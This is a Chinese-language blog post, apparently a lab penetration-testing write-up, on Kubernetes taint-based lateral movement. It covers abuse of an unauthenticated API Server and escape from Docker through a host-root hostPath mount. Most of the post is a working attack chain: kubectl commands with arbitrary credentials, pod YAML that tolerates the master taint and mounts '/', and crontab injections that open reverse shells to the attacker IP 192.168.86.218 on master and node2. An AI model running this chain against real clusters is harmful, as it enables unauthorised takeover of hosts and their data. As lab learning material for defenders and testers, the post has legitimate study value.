---
title: K8s 污点横向
---

<center><h1>K8s 污点横向 & API Server 未授权访问 & Docker 危险挂载逃逸</h1><h2>本文作者：弱鸡</h2><br><br></center>

---

</br><div align=center><img width="800" src="/img/image-20231015104203679.png" div align=center/></div></br>

名词

* Kubernetes: 简称 K8s，K8s 用来方便管理各个主机的 pod(docker)
* node: 主机
* pod: 主机里面运行的 Docker

我的理解

K8s 是一共虚拟机系统，节点机器(master)可以控制多个机器里面的 pod(docker)，网络也是分为 K8s 网络，和真实机器网络。污点是一种k8s的规则，用来设置主机的一些资源。

其中污点有三种属性(效果)：

1. **NoSchedule**：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。
2. **PreferNoSchedule**：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 `PreferNoSchedule` 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。
3. **NoExecute**：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，`NoExecute`` 污点会导致 Pod 被终止并迁移到其他节点。

在 K8s 中，设置了一共 pod(docker)，其它机器可以作为服务器访问（和负载均衡一样），而这个属性就是用来协作这个设置的。

环境搭建

kali :192.168.86.218

master:192.168.86.220

node1:192.168.86.221

node2:192.168.86.222


前言

我在学习 K8s 渗透的时候，发现大多数是管理员配置所造成的漏洞，而且污点横向，需要满足很多条件。

​1. 存在污点之后，需要有权限执行 Kubernetes 命令，来下发执行，但是这个需要 (master) 节点机器权限，这个时候就需要漏洞配合使用，这个漏洞可以达到 (master) 节点机器权限执行 Kubernetes 来下发任务给 Pod 机器执行任务。

2. 而且在下发安装 Docker 容器的时候，如果不选择的话，是默认安装在某一个 node（在安装k8s配置文件的时候可以修改）

其中 pod 节点是安装在 node1 中的。

<div align=center><img width="1000" src="/img/image-20231015162939564.png" div align=center/></div></br>

这个虽然是安装在 node1 里面，但是其它三台机器也是可以访问的(k8s的负载均衡)

<div align=center><img width="800" src="/img/image-20231015190429286.png" div align=center/></div></br>

直接使用工具拿 shell

<div align=center><img width="800" src="/img/image-20231015163437088.png" div align=center/></div></br>

<div align=center><img width="800" src="/img/image-20231015163634035.png" div align=center/></div></br>

先判断当前环境

<div align=center><img width="800" src="/img/image-20231015163852919.png" div align=center/></div></br>

判断出当前环境是 kubepods

上传cdk_linux_amd64到目标机器

自动扫描逃逸漏洞

```bash
./cdk_linux_amd64 evaluate
```

<div align=center><img width="1000" src="/img/image-20231015164259072.png" div align=center/></div></br>

<div align=center><img width="1000" src="/img/image-20231015164329196.png" div align=center/></div></br>

存在 API Server 未授权

<div align=center><img width="700" src="/img/image-20231015165254794.png" div align=center/></div></br>

> 吐槽一下k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限

上传 Kubectl ，执行命令查看污点 node

```shell
./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a describe nodes  | grep Taints --username=a --password=a #密码随便输入
describe nodes  | grep Taints #执行的命令
```

<div align=center><img width="1000" src="/img/image-20231015165454813.png" div align=center/></div></br>

```yaml
cat > x.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: control-master-x
spec:
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: "Exists"
    effect: "NoSchedule"
  containers:
  - name: control-master-x
    image: ubuntu:18.04
    command: ["/bin/sleep", "3650d"]
    volumeMounts:
    - name: master
      mountPath: /master
  volumes:
  - name: master
    hostPath:
      path: /
      type: Directory
EOF
```
> key: 污点名字
>
> image: 镜像名字
>
> mountPath: 挂载路径
>
> name pod: Docker 名字

<div align=center><img width="600" src="/img/image-20231015165543526.png" div align=center/></div></br>

使用接口下发任务到机器

```shell
./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a create -f ./x.yaml #执行的命令
```

<div align=center><img width="1000" src="/img/image-20231015165741873.png" div align=center/></div></br>

查看 pod 节点信息

```shell
./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a get pods -o wide
get pods -o #wide执行的命令
```

并没节点 master 机器

<div align=center><img width="1000" src="/img/image-20231015190736262.png" div align=center/></div></br>

坑点: 我下发了几发现都失败，而且需要挂载到 master 节点机器上面，需要多次创建，而且创建的时候name需要名字不一样

我这里创建了三次，第四次才成功

<div align=center><img width="1000" src="/img/image-20231015190947067.png" div align=center/></div></br>

执行命令

````shell
./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a exec control-master-x231 -- bash -c "ls /master"
````

> `control-master-x231` 是 master 节点 pod 名字
>
> `-c` 后是所要执行的命令
>
> `/master` 是挂载的路径


这里使用挂载逃逸可以逃逸到真实机器

<div align=center><img width="1000" src="/img/image-20231015191205567.png" div align=center/></div></br>

然后我们直接写入计划任务进行反弹 Shell

```shell
./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a exec control-master-x231 -- bash -c "echo -e '* * * * * root bash -i >& /dev/tcp/192.168.86.218/6677 0>&1\\n' >> /master/etc/crontab"
```

<div align=center><img width="1000" src="/img/image-20231015191953704.png" div align=center/></div></br>

<div align=center><img width="700" src="/img/image-20231015192029551.png" div align=center/></div></br>

拿到 master 机器权限

这个时候我们可以下发任务，进行逃逸拿到真实机器权限

```yaml
cat > x.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: node2
spec:
  nodeName: node2
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
EOF
```

> nodeName 节点名字
>
> kubectl get node -o wide 查看node信息
>
> kubectl create -f x.yaml 下发任务
>
> kubectl get pods -o wide 查看node信息
>
> kubectl delete -f x.yaml 删除pod

<div align=center><img width="1000" src="/img/image-20231015192230299.png" div align=center/></div></br>

<div align=center><img width="700" src="/img/image-20231015192953175.png" div align=center/></div></br>

<div align=center><img width="900" src="/img/image-20231015193018428.png" div align=center/></div></br>

下发成功，开始挂载逃逸

```shell
kubectl exec node2 -- bash -c "echo -e '* * * * * root bash -i >& /dev/tcp/192.168.86.218/6612 0>&1\\n' >> /mnt/etc/crontab"
kubectl exec node1 -- bash -c "cat /mnt/etc/crontab"
```

> 记得修改路径 /mnt/etc/crontab

<div align=center><img width="700" src="/img/image-20231015193328251.png" div align=center/></div></br>

<div align=center><img width="1000" src="/img/image-20231015194257353.png" div align=center/></div></br>

<div align=center><img width="700" src="/img/image-20231015194023870.png" div align=center/></div></br>

<div align=center><img width="700" src="/img/image-20231015194232859.png" div align=center/></div></br>

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 10 月 16 日"
    }
  }
</script>